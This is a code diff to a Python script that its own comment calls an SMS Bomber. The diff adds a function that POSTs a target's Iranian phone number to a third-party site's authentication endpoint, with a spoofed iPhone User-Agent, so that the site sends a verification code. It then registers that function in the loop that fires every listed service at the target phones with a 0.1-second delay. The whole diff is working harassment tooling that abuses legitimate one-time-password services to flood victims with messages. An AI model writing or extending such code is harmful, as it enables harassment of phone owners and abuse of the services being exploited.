@@ -85,6 +85,39 @@ def vitrin_shop(phone):
         print(f'{r}[!] vitrin_shop Exception for {phone}: {e}{a}')
         return False
 
+def elanza(phone):
+    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+    try:
+        url = "https://api.elanza.com/auth/request"
+        payload = {"contact": formatted_phone}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/json; charset=UTF-8",
+            "Accept": "application/json",
+            "Cache-Control": "no-cache, private"
+        }
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        response.encoding = 'utf-8'  # تنظیم کدک برای جلوگیری از خطای latin-1
+        print(f'{g}[+] Status: {response.status_code}{a}')
+        print(f'{g}[+] Response: {response.text}{a}')
+        if response.status_code == 200:
+            try:
+                response_data = response.json()
+                if response_data.get("success", False):
+                    print(f'{g}(elanza) {a}Code Sent to {phone}')
+                    return True
+                else:
+                    print(f'{r}[-] (elanza) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
+                    return False
+            except ValueError as e:
+                print(f'{r}[-] JSON Decode Error for {phone}: {e}{a}')
+                return False
+        print(f'{r}[-] (elanza) HTTP Error for {phone}: {response.status_code}{a}')
+        return False
+    except Exception as e:
+        print(f'{r}[!] elanza Exception for {phone}: {e}{a}')
+        return False
+
 # تابع ilozi
 def ilozi(phone):
     digits_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
@@ -157,7 +190,7 @@ def send_service_safe(service, phone):
 
 # تابع اصلی SMS Bomber
 def vip(phones, delay=0.1):
-    services = [vitrin_shop, ilozi]
+    services = [vitrin_shop, ilozi, elanza]
     print(f"{g}Targets: {y}{', '.join(phones)}{a}")
     print(f"{g}Services: {y}{len(services)}{a}")
     print(f"{g}Delay: {y}{delay}s{a}")
